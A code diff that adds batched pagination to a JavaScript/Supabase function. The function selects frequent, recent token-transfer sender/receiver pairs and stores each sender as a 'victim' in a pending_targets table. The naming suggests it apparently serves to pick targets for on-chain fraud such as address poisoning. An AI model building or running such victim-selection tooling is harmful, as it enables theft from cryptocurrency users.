@@ -73,7 +73,7 @@ async function fetchPendingTargets() {
   try {
     logger.info('Fetching qualified pairs (frequency >= 7, last tx within 40 days)...');
 
-    // 1. Get the max block number for this chain (using retry)
+    // 1. Get the max block number
     const maxBlockData = await withRetry(async () => {
       const { data, error } = await supabase
         .from('token_transfers')
@@ -98,51 +98,73 @@ async function fetchPendingTargets() {
 
     logger.info(`Threshold block for 40-day window: ${thresholdBlock} (max block: ${maxBlock})`);
 
-    // 2. Call the SQL function via RPC (using retry)
-    const rows = await withRetry(async () => {
-      const { data, error } = await supabase
-        .rpc('fetch_pending_targets', {
-          chain_id_param: chainId,
-          threshold_block: thresholdBlock,
-        });
+    // ─── Pagination ───
+    const BATCH_SIZE = 1000;
+    let totalInserted = 0;
+    let pageCount = 0;
 
-      if (error) throw error;
-      return data;
-    }, 'FetchPendingTargetsRPC');
+    while (true) {
+      pageCount++;
+      // Call the RPC with offset_val: 0 because NOT EXISTS dynamically shifts the dataset
+      const rows = await withRetry(async () => {
+        const { data, error } = await supabase
+          .rpc('fetch_pending_targets', {
+            chain_id_param: chainId,
+            threshold_block: thresholdBlock,
+            offset_val: 0,
+            limit_val: BATCH_SIZE,
+          });
 
-    if (!rows || rows.length === 0) {
-      logger.info('No qualified pairs found in this run.');
-      return;
+        if (error) throw error;
+        return data;
+      }, `FetchPendingTargetsRPC_page_${pageCount}`);
+
+      if (!rows || rows.length === 0) {
+        break; // No more rows to process
+      }
+
+      logger.info(`Fetched ${rows.length} qualified pairs (page ${pageCount})`);
+
+      // Prepare insert data
+      const insertData = rows.map((row) => ({
+        chain: chainName,
+        counterparty: row.receiver.toLowerCase(),
+        victim: row.sender.toLowerCase(),
+        processed: false,
+      }));
+
+      // Upsert batch
+      const insertedCount = await withRetry(async () => {
+        const { data, error } = await supabase
+          .from('pending_targets')
+          .upsert(insertData, {
+            onConflict: 'chain,counterparty,victim',
+            ignoreDuplicates: true,
+          })
+          .select();
+
+        if (error) throw error;
+        return data ? data.length : 0;
+      }, `BulkUpsertTargets_page_${pageCount}`);
+
+      totalInserted += insertedCount;
+      logger.info(`Added ${insertedCount} new pairs (page ${pageCount})`);
+
+      if (rows.length < BATCH_SIZE) {
+        break;
+      }
+
+      // Safety: prevent infinite loop if something goes wrong
+      if (pageCount > 1000) {
+        logger.warn('Reached pagination safety limit (1M rows / 1000 pages). Stopping.');
+        break;
+      }
     }
 
-    logger.info(`Found ${rows.length} qualified pairs from RPC.`);
+    logger.info(`Total new qualified pairs added this run: ${totalInserted}`);
 
-    // 3. Prepare data for dynamic bulk insert
-    const insertData = rows.map((row) => ({
-      chain: chainName,
-      counterparty: row.receiver.toLowerCase(),
-      victim: row.sender.toLowerCase(),
-      processed: false,
-    }));
-
-    // 4. Perform a high-speed bulk upsert (Single DB Roundtrip!)
-    const insertedCount = await withRetry(async () => {
-      const { data, error } = await supabase
-        .from('pending_targets')
-        .upsert(insertData, {
-          onConflict: 'chain,counterparty,victim', // Matches your composite unique constraint
-          ignoreDuplicates: true,                  // Ignores conflicts (ON CONFLICT DO NOTHING)
-        })
-        .select(); // Returns only the newly inserted records
-
-      if (error) throw error;
-      return data ? data.length : 0;
-    }, 'BulkUpsertTargets');
-
-    logger.info(`Added ${insertedCount} new qualified pairs to pending_targets.`);
-
-    if (insertedCount > 50) {
-      await sendAlert(`📊 Found ${insertedCount} new qualified pairs.`);
+    if (totalInserted > 50) {
+      await sendAlert(`📊 Found ${totalInserted} new qualified pairs.`);
     }
 
   } catch (error) {
